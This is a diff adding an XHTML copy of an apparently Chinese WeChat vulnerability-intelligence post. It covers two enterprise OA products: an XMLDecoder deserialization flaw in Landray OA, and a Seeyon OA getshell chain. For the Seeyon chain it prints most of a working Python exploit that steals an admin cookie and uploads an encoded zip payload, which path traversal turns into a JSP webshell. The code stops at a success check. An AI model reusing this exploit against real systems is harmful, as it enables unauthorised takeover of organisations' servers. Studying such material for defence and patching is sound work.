@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Hvv4月9漏洞情报</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>Hvv4月9漏洞情报</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzkyNjIxNDIyMA==&amp;mid=2247483682&amp;idx=1&amp;sn=653dd31bff6f39f8124274e6cee54d01&amp;chksm=c23bf001f54c7917389bb70077b4414363d9d3fd73d3edb72502fe1a2a66cc53d421c5a5584b&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzkyNjIxNDIyMA==&amp;mid=2247483682&amp;idx=1&amp;sn=653dd31bff6f39f8124274e6cee54d01&amp;chksm=c23bf001f54c7917389bb70077b4414363d9d3fd73d3edb72502fe1a2a66cc53d421c5a5584b&amp;scene=27#wechat_redirect</a></blockquote><div><p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">漏洞名称：蓝凌oa任意文件写入</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">产品介绍：协同管理OA软件</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">漏洞细节：</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">漏洞在/sys/search/sys_search_main/sysSearchMain.do</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">method 为 editrParam。参数为 FdParameters，在 com.landray.kmss.sys.search.jar 中的 com.landray.kmss.sys.search.actions.SysSearchMainAction 类。method 为 editrParam。</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">对 fdParemNames 的内容进行了判空。如果不为空,进入 SysSearchDictUtil.getParamConditionEntry 方法。</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">也是对 fdParemNames 进行了一次判空。然后传入 ObjectXML.objectXMLDecoderByString 方法。</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">将传入进来的 string 字符进行替换。将其载入字节数组缓冲区，在传递给 objectXmlDecoder。</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">在 objectXmlDecoder 中。就更明显了。典型的 xmlDecoder 反序列化。</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">整体流程只对 FdParameters 的内容进行了一些内容替换。 导致 xmlDecoder 反序列化漏洞。</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">利用方式：</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Xmldecoder payload 生成</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">https://github.com/mhaskar/XMLDecoder-payload-generator</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">漏洞名称：致远oa Getshell</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">产品介绍：协同管理OA软件</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">漏洞细节：</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">利用了两个漏洞</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">1）通过请求直接获取管理员权限cookie</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">2）通过上传一个压缩文件，调用接口进行文件在解压时会利用解压过程的漏洞利用获取webshell</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">利用方式：</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">def seeyon_new_rce(targeturl):</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">orgurl=targeturl</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">#通过请求直接获取管理员权限cookie</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">   </span>targeturl=orgurl+'seeyon/thirdpartyController.do'</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">post='method=access&amp;enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&amp;clientPath=127.0.0.1'</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">   </span>request = SendRequest(targeturl,post)</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">   </span>response = request.send()</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">   </span>rsp = ""</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">   </span>if response and response.code == 200 and 'set-cookie' in str(response.headers).lower():</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">       </span>cookies = <span class="Apple-converted-space"> </span>get_response_cookies(response.headers)</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space"> </span>#上传压缩文件</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">       </span>targeturl=orgurl+'seeyon/fileUpload.do?method=processUpload'</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">       </span>base64post='LS04OWViY2U2MC04MTc0LTQ2MTItOGRjMy03MTdjZTZhMDQyYWMNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZTEiOyBmaWxlbmFtZT0iMS5wbmciDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KQ29udGVudC1MZW5ndGg6IDg3OA0KDQpQSwMEFAAICAgA3XQkUQAAAAAAAAAAAAAAAAoAAABsYXlvdXQueG1s4wIAUEsHCJMG1zIDAAAAAQAAAFBLAwQUAAgICADddCRRAAAAAAAAAAAAAAAADwAAAC4uL3YzeG1haW5lLmpzcMWW207jMBCG7/sUC1JvuECJ7TiJxKJ9kL3pIUUgoaLVwvOv8MxqvthNG1oQN6NoYs/p/2fGd8tfL6uH4cfj88v+z9+f10+rt9Xt4/725np5v7hbXv1+rarok9wkWb/L1pt01btsGvuO6bvtkgymiUOSIb8bjtoPot/Z3wibrUtyjRi6z7GpuUicvXlRO3KyKm51+S0vt7Z2Xu5Ghwh73JpRE42thUepQ5/XXNGR+mzt5CgjhywCsnOGmtg5kTvwVcQjshtMfyI7ZOTSGV/Zd6SvTcGuFhXoJlDYJm4vEFs0vxKD5oWo9OQONYFHVi/UqGRAJXsghfMRvHX464CU35oU78qijcmSpfOzIDMlqiYaOmJfPR6PdmPfHr3gRdOAIRFdUOh9b3ofjANiR6Ia1Qf4aneswC7kInNJsfOGjvZOBVx2djKgesr8ruA/Job/3kimmIlOVFYEoIxISpSF1SHpG3+4/jrBBjAN3+JLbHqwhZOhbb+qbpovphajbXyuL6diWEPT260DNjuTl8+TMzsx2XdraKifYsjEHuFkVgvo9OPcIENGDCxnDjjJ+mvu7CnYEQ07boRdnVeMzJ/VKefFWWyfqdrqvnCwVtvJsMu9X1K3+SdHE2yiQ785o6LCZIXii5ksc1I3RWsavYW3hNxiF9PCgfqQjcNEzCGPWaX4qnObTjZ+nZ+U/f4BNAfLl++Q8u0xyrHYqlMc4Kub7y71wo1QdtmMd+CJeXX5O79EBL5G73m+b5PNUL5vMaXl7gcwouWzOutALsyoQPDM9wBtljOWewo46pascxwVQezB0d4Br/5zcrG8/wdQSwcIyIdUE2sCAAC3DgAAUEsBAhQAFAAICAgA3XQkUZMG1zIDAAAAAQAAAAoAAAAAAAAAAAAAAAAAAAAAAGxheW91dC54bWxQSwECFAAUAAgICADddCRRyIdUE2sCAAC3DgAADwAAAAAAAAAAAAAAAAA7AAAALi4vdjN4bWFpbmUuanNwUEsFBgAAAAACAAIAdQAAAOMCAAAAAA0KLS04OWViY2U2MC04MTc0LTQ2MTItOGRjMy03MTdjZTZhMDQyYWMNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iY2FsbE1ldGhvZCINCkNvbnRlbnQtTGVuZ3RoOiAxMg0KDQpyZXNpemVMYXlvdXQNCi0tODllYmNlNjAtODE3NC00NjEyLThkYzMtNzE3Y2U2YTA0MmFjDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpcnN0U2F2ZSINCkNvbnRlbnQtTGVuZ3RoOiA0DQoNCnRydWUNCi0tODllYmNlNjAtODE3NC00NjEyLThkYzMtNzE3Y2U2YTA0MmFjDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InRha2VPdmVyIg0KQ29udGVudC1MZW5ndGg6IDUNCg0KZmFsc2UNCi0tODllYmNlNjAtODE3NC00NjEyLThkYzMtNzE3Y2U2YTA0MmFjDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InR5cGUiDQpDb250ZW50LUxlbmd0aDogMQ0KDQowDQotLTg5ZWJjZTYwLTgxNzQtNDYxMi04ZGMzLTcxN2NlNmEwNDJhYw0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJpc0VuY3J5cHQiDQpDb250ZW50LUxlbmd0aDogMQ0KDQowDQotLTg5ZWJjZTYwLTgxNzQtNDYxMi04ZGMzLTcxN2NlNmEwNDJhYy0t'</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">       </span>myrandstr=random_str(8)</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">       </span>post=base64.b64decode(base64post).replace('v3xmaine.jsp',myrandstr+'.txt')</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">       </span>headers={'Content-Type': 'multipart/form-data; boundary=89ebce60-8174-4612-8dc3-717ce6a042ac','Cookie':cookies}</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">       </span>request = SendRequest(targeturl,data=post,headers=headers)</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">       </span>response = request.send()</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">       </span>if <span class="Apple-converted-space"> </span>response:</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">           </span>try:</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">               </span>rsp = response.read(11 * 1000 * 1000)</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">           </span>except Exception as e:</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">               </span>if ("IncompleteRead" in str(e)):</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">                   </span>rsp = e.partial</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">           </span>reg=re.compile('fileurls=fileurls\+","\+\'([\-\d]+)\'')</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">           </span>matchs=reg.findall(rsp)</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">           </span>if matchs:</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">               </span>fileid=matchs[0]</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">#触发文件解压漏洞，获取webshell</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">              </span>targeturl=orgurl+'seeyon/ajax.do'</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">               </span>datestr=time.strftime('%Y-%m-%d')</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">               </span>post='method=ajaxAction&amp;managerName=portalDesignerManager&amp;managerMethod=uploadPageLayoutAttachment&amp;arguments=%5B0%2C%22'+datestr+'%22%2C%22'+fileid+'%22%5D'</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">               </span>headers={'Cookie':cookies}</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">               </span>request = SendRequest(targeturl,data=post,headers=headers)</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">               </span>response = request.send()</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">               </span>if response:</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">                   </span>rsp_headers=response.headers</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">                   </span>try:</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">                       </span>rsp = response.read(11 * 1000 * 1000)</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">                   </span>except Exception as e:</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">                       </span>if ("IncompleteRead" in str(e)):</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">                           </span>rsp = e.partial</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">                   </span>if response.code == 500 and ("Error on" in rsp):</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">                       </span>testrule=orgurl+'seeyon/common/designer/pageLayout/'+myrandstr+'.txt'</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">                       </span>if get_url_content(testrule):</span></p>
+<span style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;"> <span class="Apple-converted-space">                           </span>#漏洞存在</span></span>
+</div>
+        
+</body>
+</html>
